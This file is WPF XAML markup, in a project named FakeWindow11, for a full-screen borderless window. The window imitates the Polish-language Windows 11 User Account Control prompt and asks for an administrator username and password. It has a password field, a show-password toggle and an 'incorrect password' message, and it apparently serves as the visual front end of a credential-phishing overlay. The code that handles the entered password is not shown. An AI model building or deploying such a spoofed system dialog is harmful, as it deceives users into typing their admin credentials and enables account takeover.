<Window x:Class="FakeWindow11.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:FakeWindow11"
        mc:Ignorable="d"
        Title="FakeWindow11"
        Height="1080"
        Width="1920"
        AllowsTransparency="True"
        WindowStyle="None"
        Background="Transparent"
        >
	<Grid>

		<Rectangle Fill="Black" Opacity="0.75"/>

		<Grid
            Width="456"
            Height="660"
              >
			<StackPanel Orientation="Vertical">
				<Border Background="#373737" Width="456" Height="115" CornerRadius="7 7 0 0">
					<Grid>
						<TextBlock 
                            Text="×"
                            Foreground="#fff"
                            FontSize="23"
                            HorizontalAlignment="Right"
                            VerticalAlignment="Top"
                            Margin="0 0 9 0"
                            MouseDown="CloseBtn"
                            />
						<StackPanel
                            Orientation="Vertical"
                            Margin="24 18"
                            >
							<TextBlock 
                                Foreground="#fff" 
                                Text="Kontrola konta użytkownika"
                                FontSize="11"
                                FontStretch="ExtraExpanded"
                                FontFamily="Segoe UI"
                            />

							<TextBlock
                                Foreground="#fff"
                                Text="Czy chcesz zezwolić tej aplikacji na wprowadzenie zmian na tym urządzeniu?"
                                FontFamily="Segoe UI"
                                FontSize="20"
                                TextWrapping="Wrap"
                                Margin="0 5 0 0"
                            />
						</StackPanel>

					</Grid>
				</Border>
				<Grid
                    Background="#2C2C2C"
                    Height="462"
                    Width="456"
                    >
					<StackPanel
                        Orientation="Vertical"
                        Margin="24 20"
                        >
						<StackPanel Orientation="Horizontal">
							<Image Height="37" Width="33" x:Name="ProgramIcon" />
							<TextBlock
                                Text=""
                                Foreground="#fff"
                                FontSize="17"
                                FontFamily="Segoe UI"
                                VerticalAlignment="Center"
                                Margin="5 0 0 0"
                                x:Name="name"
                            />
						</StackPanel>

						<TextBlock
                            Foreground="#fff"
                            FontSize="14"
                            Margin="0 20 0 0"
                            FontFamily="Segoe UI"
                            x:Name="Info"
                            >

						</TextBlock>

						<TextBlock
                            Text="Pokaż więcej szczegółów"
                            x:Name="InfoButton"
                            Foreground="#99EBFF"
                            Background="Transparent"
                            Margin="-5 24 0 0"
                            Padding="7 5 7 7"
                            FontSize="13"
                            FontFamily="Segoe UI"
                            MouseDown="ToggleInfoBtn"
                            HorizontalAlignment="Left"
                            Cursor="Hand"
                            >
							<TextBlock.Style>
								<Style TargetType="TextBlock">
									<Style.Triggers>
										<EventTrigger RoutedEvent="UIElement.MouseEnter">
											<BeginStoryboard>
												<Storyboard>
													<ColorAnimation Storyboard.TargetProperty="(TextBlock.Background).(SolidColorBrush.Color)"
                                                    To="#373737" Duration="0:0:0.0" />
												</Storyboard>
											</BeginStoryboard>
										</EventTrigger>
										<EventTrigger RoutedEvent="UIElement.MouseLeave">
											<BeginStoryboard>
												<Storyboard>
													<ColorAnimation Storyboard.TargetProperty="(TextBlock.Background).(SolidColorBrush.Color)"
                                                    To="Transparent" Duration="0:0:0.0" />
												</Storyboard>
											</BeginStoryboard>
										</EventTrigger>
									</Style.Triggers>
								</Style>
							</TextBlock.Style>
						</TextBlock>

						<TextBlock
                            Foreground="#fff"
                            Text="Aby kontynuować, wprowadź nazwę użytkownika i hasło administratora."
                            TextWrapping="Wrap"
                            FontSize="14"
                            Margin="0 36 0 0"
                            FontFamily="Segoe UI"
                            />

						<TextBlock
                            Foreground="#fff"

                            x:Name="Username"
                            FontSize="14"
                            Margin="0 30 0 0"
                            FontFamily="Segoe UI"
                            />

						<TextBlock
                            Foreground="#fff"
                            Text="Hasło"
                            FontSize="14"
                            Margin="0 12 0 1"
                            FontFamily="Segoe UI"
                            />

						<StackPanel Orientation="Horizontal">
							<PasswordBox
                                Background="#fff"
                                Foreground="#000"
                                Width="346"
                                Height="32"
                                x:Name="Password"
                                FontSize="14"
                                HorizontalAlignment="Left"
                                FontFamily="Segoe UI"
                                Padding="7 5 5 5"
                                KeyDown="PassSubmit"
                            >
								<PasswordBox.Template>
									<ControlTemplate TargetType="PasswordBox">
										<Border BorderBrush="#0078D4"
                                        BorderThickness="1"
                                        Background="{TemplateBinding Background}"
                                        CornerRadius="3">
											<ScrollViewer x:Name="PART_ContentHost" />
										</Border>
									</ControlTemplate>
								</PasswordBox.Template>
							</PasswordBox>
							<TextBox
                                Background="#fff"
                                Foreground="#000"
                                Width="346"
                                Height="32"
                                x:Name="Password2"
                                FontSize="14"
                                Visibility="Collapsed"
                                HorizontalAlignment="Left"
                                FontFamily="Segoe UI"
                                Padding="7,5,5,5"
                                KeyDown="PassSubmit"
                                >

								<TextBox.Style>
									<Style TargetType="TextBox">
										<Setter Property="Template">
											<Setter.Value>
												<ControlTemplate TargetType="TextBox">
													<Border BorderBrush="#0078D4"
                                                        BorderThickness="1"
                                                        Background="{TemplateBinding Background}"
                                                        CornerRadius="3">
														<ScrollViewer x:Name="PART_ContentHost" />
													</Border>
												</ControlTemplate>
											</Setter.Value>
										</Setter>
									</Style>
								</TextBox.Style>
							</TextBox>

							<TextBlock 
                                Text="👁"
                                OverridesDefaultStyle="True"
                                VerticalAlignment="Center"
                                FontSize="11"
                                Margin="-27 0 0 0"
                                Padding="6 8"
                                MouseEnter="PassShow"
                                MouseLeave="PassHide"
                                Cursor="Hand"
                                Height="32">
								<TextBlock.Style>
									<Style TargetType="TextBlock">
										<Setter Property="Foreground" Value="#000"/>

										<Style.Triggers>
											<Trigger Property="IsMouseOver" Value="True">
												<Setter Property="Background" Value="#0078D4"/>
												<Setter Property="Foreground" Value="#fff"/>
											</Trigger>
											<Trigger Property="IsFocused" Value="True">
												<Setter Property="Foreground" Value="#000"/>
											</Trigger>
										</Style.Triggers>
									</Style>
								</TextBlock.Style>
							</TextBlock>


						</StackPanel>

						<TextBlock
                            Foreground="#fff"
                            TextWrapping="Wrap"
                            FontSize="14"
                            Margin="0 12 0 0"
                            FontFamily="Segoe UI"
                            x:Name="SystemUser"
                        />

						<TextBlock
                            Foreground="#FFF000"
                            Text="Nazwa użytkownika lub hasło nie są poprawne."
                            FontSize="14"
                            Margin="0 24 0 1"
                            FontFamily="Segoe UI"
                            x:Name="ErrorMsg"
                            />

					</StackPanel>
				</Grid>
				<Border Background="#202020" Width="456" Height="82" CornerRadius="0 0 7 7">
					<Grid
                        
                    >
						<StackPanel 
                        Orientation="Horizontal"
                        VerticalAlignment="Center"
                        HorizontalAlignment="Center"
                        >
							<Button Width="203"
                            Height="30"
                            Background="#2D2D2D"
                            Content="Tak"
                            Foreground="White"
                            Margin="0 0 4 0"
                            Click="CheckBtn"
                            Cursor="Hand"
                            >
								<Button.Template>
									<ControlTemplate TargetType="Button">
										<Border x:Name="border"
                                        Background="{TemplateBinding Background}"
                                        Width="203"
                                        Height="30"
                                        CornerRadius="4"
                                        >
											<ContentPresenter HorizontalAlignment="Center"
                                      VerticalAlignment="Center"/>
										</Border>
										<ControlTemplate.Triggers>
											<Trigger Property="IsMouseOver" Value="True">
												<Setter TargetName="border" Property="Background" Value="#3D3D3D"/>
											</Trigger>
										</ControlTemplate.Triggers>
									</ControlTemplate>
								</Button.Template>
							</Button>
							<Button
                                Width="203"
                                Height="30"
                                Background="#4CC0FC"
                                Content="Nie"
                                Click="CancelBtn"
                                Foreground="#153546"
                                Margin="4 0 0 0"
                                Cursor="Hand"
                            >
								<Button.Template>
									<ControlTemplate TargetType="Button">
										<Border
                                            x:Name="border"
                                            Background="{TemplateBinding Background}"
                                            Width="203"
                                            Height="30"
                                            CornerRadius="4"
                                        >
											<ContentPresenter
                                                HorizontalAlignment="Center"
                                                VerticalAlignment="Center"
                                                />
										</Border>
										<ControlTemplate.Triggers>
											<Trigger Property="IsMouseOver" Value="True">
												<Setter TargetName="border" Property="Background" Value="#6DCEFF"/>
											</Trigger>
										</ControlTemplate.Triggers>
									</ControlTemplate>
								</Button.Template>
							</Button>
						</StackPanel>
					</Grid>
				</Border>
			</StackPanel>
		</Grid>
	</Grid>
</Window>
